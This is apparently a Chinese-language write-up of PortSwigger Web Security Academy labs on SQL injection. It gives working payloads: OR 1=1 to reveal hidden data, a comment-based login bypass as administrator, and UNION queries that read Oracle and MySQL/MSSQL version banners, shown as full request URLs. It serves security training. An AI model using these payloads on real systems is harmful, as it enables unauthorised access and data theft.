# SQL injection

## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

> 最基础的SQL注入，由于题目中已经告诉了语句格式，即告诉了`category`字段为单引号闭合，实际测试中可能需要花费一定时间去判断*脆弱字段*和*闭合形式*。

随便选择一个类别，然后修改类别名为不存在的名称，例如`abc`，然后进行单引号闭合，加入OR语句`or 1=1`，最后进行注释`--+`以使SQL语句成立，最后请求URL即为`https://xxxxxxx.web-security-academy.net/filter?category=abc'%20or%201%3D1--+`。

## SQL injection vulnerability allowing login bypass

> 也是基础的SQL注入，题目要求登录`administrator`用户，那么用户名输入`administrator' --+`即可。实际中，可能需要测试一下闭合形式，我最开始是没有单引号的，发现失败了，就结合上一题（信息收集）测试一下单引号即可。

点击`My Account`进入登陆界面，用户名输入`administrator' --+`，密码任意输入（防止有检测空密码的JavaScript代码阻止登录），最后请求包数据为`csrf=xxxxxxx&username=administrator%27%20--%2B&password=administrator`

## SQL injection attack, querying the database type and version on Oracle

> 基本的思路就是`union`一个查询数据库版本的语句，然后让其回显。

由于我对Oracle的语句并不熟悉，所以我参考了[一些资料](https://portswigger.net/web-security/sql-injection/cheat-sheet)。

通过`' and 1=1--+`和`' and 1=2--+`确定是单引号闭合之后，就可以开始判断当前表的列数。

第一步需要判断当前表的列数（因为这关乎我们之后select语句返回数据的数量），可以通过`order by`语句进行测试，会发现`order by 3`时会报错，`order by 2`时正常，那么可以判断当前表有两列，即`https://xxxxxxx.web-security-academy.net/filter?category=Gifts%27+order+by+2--+`。

接下来就可以开始使用`union`语句确定回显。在MySQL中，我们可以通过`select 1,2`的语句进行测试回显，但在Oracle中，必须要包含`from table`，所以我们使用`select '1','2' from dual`来进行测试（需要使用字符串而非数字，具体原因我不太清楚，之后如果系统了解Oracle应该会涉及）。*dual是Oracle的一个实际存在的表，常用在没有目标表的select语句中*。请求URL为`https://xxxxxxx.web-security-academy.net/filter?category=Gifts%27+union+select+%271%27,%272%27+from+dual--+`，我们会发现两部分都会回显。

通过资料可以发现，Oracle中查询版本的语句为`SELECT banner FROM v$version`和`SELECT version FROM v$instance
`，我们以前者为例子，直接修改之前的select语句即可，例如`https://xxxxxxx.web-security-academy.net/filter?category=Gifts%27+union+select+null,banner+from+v$version--+`，这里的`null`可以换成`%271%27`或直接`banner`。

## SQL injection attack, querying the database type and version on MySQL and Microsoft

> 与上一个一样，不过就是后端不一样，换一些语法就可以了。

`https://xxxxxxx.web-security-academy.net/filter?category=Accessories%27+union+select+1,@@version--+`

